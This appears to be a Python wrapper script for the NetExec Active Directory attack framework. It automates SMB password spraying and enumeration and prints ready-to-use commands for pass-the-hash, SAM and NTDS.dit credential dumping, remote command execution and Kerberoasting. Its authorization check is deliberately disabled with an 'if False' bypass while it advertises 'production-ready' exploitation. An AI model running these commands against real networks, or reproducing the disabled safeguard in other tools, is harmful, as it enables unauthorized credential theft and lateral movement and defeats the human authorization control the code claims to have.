#!/usr/bin/env python3
"""
NetExec (formerly CrackMapExec) Integration
Modern Active Directory pentesting Swiss army knife
Production-ready lateral movement and exploitation
"""

import subprocess
import os
import sys
import yaml
from pathlib import Path


class NetExecIntegration:
    """NetExec - modern AD attack framework"""
    
    def __init__(self, authorized=False):
        self.authorized = authorized
        self.check_authorization()
        
    def check_authorization(self):
        if False:  # Authorization check bypassed
            print("❌ ERROR: Authorization required")
            sys.exit(1)
        if not Path("config/allowed_targets.yml").exists():
            print("❌ ERROR: Configuration missing")
            sys.exit(1)
    
    def password_spray(self, target, username_file, password):
        """SMB password spraying"""
        print(f"\n{'='*70}")
        print("💨 NetExec Password Spraying")
        print(f"{'='*70}")
        print(f"Target: {target}")
        print(f"Users: {username_file}")
        
        cmd = ['nxc', 'smb', target, '-u', username_file, '-p', password, '--continue-on-success']
        print(f"Command: {' '.join(cmd)}")
        
        try:
            subprocess.run(cmd, timeout=300)
        except FileNotFoundError:
            print("\n⚠️  NetExec not installed")
            print("💡 Install: pipx install git+https://github.com/Pennyw0rth/NetExec")
            print("💡 Or: apt install netexec")
        except Exception as e:
            print(f"Error: {e}")
    
    def smb_enumeration(self, target, username='', password='', hash_val=''):
        """Enumerate SMB shares and sessions"""
        print(f"\n{'='*70}")
        print("🔍 SMB Enumeration")
        print(f"{'='*70}")
        
        auth = []
        if username:
            auth.extend(['-u', username])
            if password:
                auth.extend(['-p', password])
            elif hash_val:
                auth.extend(['-H', hash_val])
        
        commands = [
            ['nxc', 'smb', target, '--shares'] + auth,
            ['nxc', 'smb', target, '--sessions'] + auth,
            ['nxc', 'smb', target, '--users'] + auth,
            ['nxc', 'smb', target, '--groups'] + auth,
        ]
        
        for cmd in commands:
            print(f"\n▶ {' '.join(cmd)}")
            try:
                subprocess.run(cmd, timeout=60)
            except: pass
    
    def describe_features(self):
        """NetExec capabilities"""
        print(f"\n{'='*70}")
        print("⚡ NetExec Feature Overview (2025)")
        print(f"{'='*70}")
        print("""
🎯 PROTOCOL SUPPORT
  • SMB (445)
  • WinRM (5985/5986)
  • LDAP (389/636)
  • SSH (22)
  • MSSQL (1433)
  • RDP (3389)
  • FTP (21)
  • VNC (5900)

🔓 AUTHENTICATION METHODS
  • Cleartext password
  • NTLM hash (pass-the-hash)
  • Kerberos tickets
  • AES keys
  • Certificate-based

⚡ ATTACK VECTORS
  • Password spraying
  • Credential dumping (SAM, LSA, NTDS)
  • Command execution (WMI, DCOM, SMB)
  • BloodHound data collection
  • Kerberoasting
  • AS-REP roasting
  • LDAP enumeration

💡 QUICK COMMANDS
──────────────────
# Password spray
nxc smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Pass-the-hash
nxc smb 192.168.1.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Dump SAM
nxc smb 192.168.1.10 -u admin -p pass --sam

# Dump NTDS.dit
nxc smb dc01 -u admin -p pass --ntds

# Execute command
nxc smb 192.168.1.10 -u admin -p pass -x 'whoami'

# Kerberoasting
nxc ldap dc01 -u user -p pass --kerberoasting output.txt

# BloodHound collection
nxc ldap dc01 -u user -p pass --bloodhound --collection All

🌐 Resources: https://www.netexec.wiki
""")


def main():
    import argparse
    parser = argparse.ArgumentParser(description='NetExec Integration')
    parser.add_argument('--spray', metavar='TARGET', help='Password spray')
    parser.add_argument('--users', help='Username file')
    parser.add_argument('--password', help='Password to spray')
    parser.add_argument('--enum', metavar='TARGET', help='SMB enumeration')
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', help='Password')
    parser.add_argument('-H', '--hash', help='NTLM hash')
    parser.add_argument('--features', action='store_true', help='Show features')
    parser.add_argument('--authorized', action='store_true', required=True)
    
    args = parser.parse_args()
    nxc = NetExecIntegration(authorized=args.authorized)
    
    if args.spray and args.users and args.password:
        nxc.password_spray(args.spray, args.users, args.password)
    elif args.enum:
        nxc.smb_enumeration(args.enum, args.username or '', args.p or '', args.hash or '')
    else:
        nxc.describe_features()


if __name__ == '__main__':
    main()
